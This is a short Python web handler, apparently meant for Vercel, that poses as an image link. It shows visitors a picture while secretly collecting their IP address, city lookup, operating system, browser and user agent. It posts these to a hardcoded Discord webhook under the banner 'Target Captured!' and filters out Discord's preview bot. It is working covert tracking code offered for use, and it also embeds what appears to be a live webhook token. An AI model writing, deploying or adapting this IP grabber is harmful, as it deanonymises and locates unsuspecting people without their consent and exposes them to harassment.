from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx, base64, httpagentparser

# --- IMPORTANT: CHANGE THIS TO YOUR ACTUAL DISCORD WEBHOOK URL ---
webhook = 'https://discord.com/api/webhooks/1453028520761626776/N0tjZRoNrNCsBBg0YHXHcPCix0lZhM1TeWsxUQDYTUoLZNdwNVf8nGo-ITX7MFTujFwi'

# Fallback image (The one people will see)
image_source = 'https://th.bing.com/th/id/OIP.xXJEf5k4LqmkR9skmyBlCQHaIi?w=153&h=180&c=7&r=0&o=7&cb=ucfimg2&pid=1.7&rm=3&ucfimg=1'
bindata = httpx.get(image_source).content

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 1. Get the real IP from Vercel's proxy headers
        forwarded = self.headers.get('x-forwarded-for', '')
        # Vercel often provides a list; take the first one
        ip = forwarded.split(',')[0].strip() if forwarded else self.client_address[0]

        # 2. Identify the Visitor
        useragent = self.headers.get('user-agent', 'Unknown')
        os, browser = httpagentparser.simple_detect(useragent)
        
        # 3. Check if it's the Discord Preview Bot
        # Discord IPs usually start with 35.x, 34.x, or 104.x
        is_discord = any(ip.startswith(prefix) for prefix in ('35.', '34.', '104.196')) or 'discord' in useragent.lower()

        # 4. SEND THE IMAGE FIRST (Crucial for Discord to show the preview)
        self.send_response(200)
        self.send_header('Content-type', 'image/jpeg')
        self.end_headers()
        self.wfile.write(bindata)

        # 5. Background Task: Send the info to your Webhook
        try:
            if is_discord:
                # Log that Discord is unfurling the link
                payload = {
                    "username": "Fentanyl",
                    "content": f"**Discord Preview Detected**\nIP: `{ip}`\nUA: `{useragent}`"
                }
            else:
                # Log the actual human user
                ip_data = httpx.get(f'https://ipinfo.io/{ip}/json').json()
                payload = {
                    "username": "bobs slave",
                    "embeds": [{
                        "title": "DADDY BOB STRIKES AGAIN!",
                        "color": 16711803,
                        "description": f"**Target Captured!**\n**IP:** `{ip}`\n**City:** `{ip_data.get('city')}`\n**OS:** `{os}`\n**Browser:** `{browser}`",
                        "footer": {"text": f"UserAgent: {useragent}"}
                    }]
                }
            
            # Post to Discord
            if "discord.com/api/webhooks" in webhook:
                httpx.post(webhook, json=payload)
        except Exception as e:
            print(f"Webhook failed: {e}")

        return
